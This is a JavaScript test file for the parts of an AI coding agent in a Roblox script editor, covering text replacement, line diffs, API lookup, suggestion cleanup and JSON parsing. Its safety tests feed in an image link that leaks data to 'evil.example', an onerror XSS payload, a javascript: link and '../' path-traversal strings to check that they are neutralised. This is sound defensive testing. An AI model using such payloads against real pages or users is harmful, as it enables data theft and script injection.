// Claude エージェントの部品 (置き換え・差分・API 検索・候補の整形・JSON 読み取り):  node tests/agent.test.mjs
import { readFileSync } from 'node:fs'
import { applyReplace, lineDiff, minimalChange, numbered, lookupApi, cleanPath, byteLen } from '../js/app/agent.js'
import { renderMarkdown } from '../js/app/markdown.js'
import { cleanSuggestion } from '../js/editor/ai.js'
import { parseJsonLoose } from '../js/app/claude.js'
import { setRobloxApi } from '../js/editor/apidb.js'

setRobloxApi(JSON.parse(readFileSync(new URL('../data/roblox-api.json', import.meta.url), 'utf8')))

let pass = 0, fail = 0
const eq = (name, got, want) => {
  const ok = JSON.stringify(got) === JSON.stringify(want)
  if (ok) pass++
  else { fail++; console.log(`✗ ${name}\n  got:  ${JSON.stringify(got)}\n  want: ${JSON.stringify(want)}`) }
}
const throws = (name, fn, re) => {
  try { fn(); fail++; console.log(`✗ ${name}: did not throw`) } catch (e) { if (re.test(e.message)) pass++; else { fail++; console.log(`✗ ${name}: ${e.message}`) } }
}

// ---- applyReplace ----
const src = 'local a = 1\nif a then\n\tprint("x")\nend\n'
eq('exact', applyReplace(src, 'print("x")', 'print("y")').text, 'local a = 1\nif a then\n\tprint("y")\nend\n')
eq('multi-line', applyReplace(src, 'if a then\n\tprint("x")\nend', 'print(a)').text, 'local a = 1\nprint(a)\n')
// 字下げが違っても行単位で見つけ、置き換え先の字下げに合わせる
eq('loose indent', applyReplace(src, '    print("x")', '    print("z")').text, 'local a = 1\nif a then\n\tprint("z")\nend\n')
eq('loose flag', applyReplace(src, '    print("x")', 'x').loose, true)
throws('not found', () => applyReplace(src, 'nothing here', 'x'), /not found/)
throws('ambiguous', () => applyReplace('x()\nx()\n', 'x()', 'y()'), /2 times/)
eq('replace all', applyReplace('x()\nx()\n', 'x()', 'y()', true).text, 'y()\ny()\n')
throws('empty old', () => applyReplace(src, '', 'x'), /empty/)
eq('position', applyReplace(src, 'end', 'end -- done').from, src.indexOf('end'))

// ---- minimalChange ----
eq('minimal', minimalChange('abcdef', 'abXYef'), { from: 2, to: 4, insert: 'XY' })
eq('minimal insert', minimalChange('ab', 'aXb'), { from: 1, to: 1, insert: 'X' })
eq('minimal same', minimalChange('ab', 'ab'), { from: 2, to: 2, insert: '' })

// ---- lineDiff ----
const d = lineDiff('a\nb\nc\nd\ne', 'a\nb\nC\nd\ne\nf')
eq('diff counts', [d.added, d.removed], [2, 1])
eq('diff ops', d.ops.map(o => o.t + o.s), [' a', ' b', '-c', '+C', ' d', ' e', '+f'])
eq('diff new file', lineDiff('', 'x\ny').added, 2)
eq('diff line numbers', d.ops.find(o => o.t === '+').b, 3)

// ---- numbered ----
eq('numbered', numbered('a\nb\nc', 2, 3), '2| b\n3| c')
eq('numbered pad', numbered(Array.from({ length: 12 }, (_, i) => 'l' + i).join('\n'), 9, 10), ' 9| l8\n10| l9')

// ---- lookupApi ----
eq('api class', /class TweenService/.test(lookupApi('TweenService')) && /Create\(instance: Instance/.test(lookupApi('TweenService')), true)
eq('api no instance noise', /FindFirstChild\(/.test(lookupApi('TweenService')), false)
eq('api member', lookupApi('Humanoid.WalkSpeed'), 'Humanoid.WalkSpeed — property float')
eq('api method', /^Instance:FindFirstChild — method/.test(lookupApi('Part:FindFirstChild')), true)
eq('api enum', /^Enum\.EasingStyle: Linear, Sine/.test(lookupApi('Enum.EasingStyle')), true)
eq('api lib', /string\.format\(fmt: string/.test(lookupApi('string.format')), true)
eq('api executor', /executor API/.test(lookupApi('hookmetamethod')), true)
eq('api datatype', /CFrame\.new/.test(lookupApi('CFrame')), true)
eq('api drawing', /Drawing\.new/.test(lookupApi('Drawing')), true)
eq('api service call', /class Players/.test(lookupApi('game:GetService("Players")')), true)
eq('api similar', /Similar: .*TweenService/.test(lookupApi('TweenServ')), true)

// ---- cleanSuggestion ----
eq('suggest none', cleanSuggestion('<none>', 'a', 'b'), '')
eq('suggest fence', cleanSuggestion('```lua\nprint(1)\n```', 'x', ''), 'print(1)')
eq('suggest dup line', cleanSuggestion('local x = 1', 'local x', ''), ' = 1')
eq('suggest cut repeat', cleanSuggestion('a()\nprint(2)', 'local t = 1\n', '\nprint(2)\n'), 'a()')
eq('suggest keep inner end', cleanSuggestion('if x then\n\treturn\nend', 'local t = 1\n', '\nend\n'), 'if x then\n\treturn\nend')
eq('suggest cursor tag', cleanSuggestion('foo<CURSOR>', '', ''), 'foo')

// ---- parseJsonLoose ----
eq('json plain', parseJsonLoose('{"a":1}'), { a: 1 })
eq('json fence', parseJsonLoose('Here:\n```json\n{"edits":[]}\n```'), { edits: [] })
eq('json embedded', parseJsonLoose('結果: {"x": [1, 2]} です'), { x: [1, 2] })
throws('json bad', () => parseJsonLoose('no json'), /読み取れません/)

// ---- 安全: パス・送信サイズ・AI の回答の表示 ----
eq('path normal', cleanPath('./src/main.lua'), 'src/main.lua')
eq('path leading slash', cleanPath('/a/b.lua'), 'a/b.lua')
throws('path dotdot', () => cleanPath('../secret'), /Invalid path/)
throws('path dotdot middle', () => cleanPath('a/../../b'), /Invalid path/)
throws('path empty', () => cleanPath('  '), /Invalid path/)
throws('path control char', () => cleanPath('a\u0000b'), /Invalid path/)
eq('bytes ascii', byteLen('abc'), 3)
eq('bytes japanese', byteLen('日本'), 6)
const md = renderMarkdown('![x](https://evil.example/?d=secret) <img src=x onerror=alert(1)> [a](javascript:alert(1))', { images: false })
eq('ai md no img tag', /<img/i.test(md), false)
eq('ai md no js link', /javascript:/i.test(md.replace(/&[a-z#0-9]+;/g, '')) && /href="javascript/i.test(md), false)
eq('preview md keeps images', /<img/.test(renderMarkdown('![x](https://e.example/a.png)')), true)

console.log(`agent: ${pass} passed, ${fail} failed`)
// (読み込んだモジュールが BroadcastChannel を開いたままにするので、明示的に終了する)
process.exit(fail ? 1 : 0)
